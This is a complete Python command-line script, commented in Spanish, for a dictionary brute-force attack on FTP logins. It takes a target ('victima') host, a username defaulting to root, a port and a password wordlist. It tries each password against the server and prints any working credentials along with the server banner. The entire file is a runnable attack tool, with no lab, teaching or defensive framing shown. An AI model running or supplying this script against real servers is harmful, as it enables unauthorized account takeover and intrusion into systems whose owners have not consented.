#! /usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import argparse
import ftplib
from termcolor import colored

def ftp_brute(victima,usuario,puerto,diccionario):  #Función para el ataque de fuerza bruta

    #Lee y prueba las contraseñas que irá probando en el login
    try:
        dic = open(diccionario,'r')
        for password in dic:
            password = password[:-1]

            try:
                ftp = ftplib.FTP()
                ftp.connect(victima,puerto)
                ftp.login(user=usuario,passwd=password)
                print(colored(" Usuario y contraseña correctos: ", 'yellow', attrs=['bold', 'blink']))
                print(colored("\n\t Usuario: " + usuario, 'green', attrs=['bold', 'blink']))
                print(colored("\t Contraseña: " + password, 'green', attrs=['bold', 'blink']))
                print(colored("\t Banner del servidor: " + ftp.getwelcome(), 'green', attrs=['bold', 'blink']))
            except ftplib.error_perm:
                print(" La contraseña " + password + " es incorrecta")
            except ftplib.error_proto as e:
                print(colored(" Error: " + str(e), 'red', attrs=['bold', 'blink']))
                exit()
            except socket.timeout:  #Excepción en caso de no haber conexión
                print(colored(" Error al conectar con FTP, comprueba el estado del puerto", 'red', attrs=['bold', 'blink']))
                exit()

        ftp.quit()
    except IOError:
        print(colored(" %s diccionario no encontrado " %diccionario, 'red', attrs=['bold', 'blink']))

def main():     #Función principal para parsear argumentos
    parser = argparse.ArgumentParser(description="FTP Bruteforce")
    parser.add_argument("-v", "--victima", dest="victima", type=str,help="Victima para hacer el ataque por fuerza bruta", metavar="IP/URL")
    parser.add_argument("-u", "--usuario", dest="usuario", type=str, help="Usuario para el que se probará el ataque por fuerza bruta", metavar="USERNAME",default="root")
    parser.add_argument("-p", "--puerto", dest="puerto", type=int, help="Puerto para el que se probará el ataque por fuerza bruta", metavar="PUERTO", default=21)
    parser.add_argument("-d", "--diccionario", dest="diccionario", type=str, help="Diccionario para probar el ataque por fuerza bruta", metavar="DICCIONARIO")

    args = parser.parse_args()

    if args.victima and args.diccionario:
        ftp_brute(args.victima,args.usuario,args.puerto,args.diccionario)
    else:
        parser.print_help()

"""
Programa principal
"""
if __name__ == "__main__":
    main()
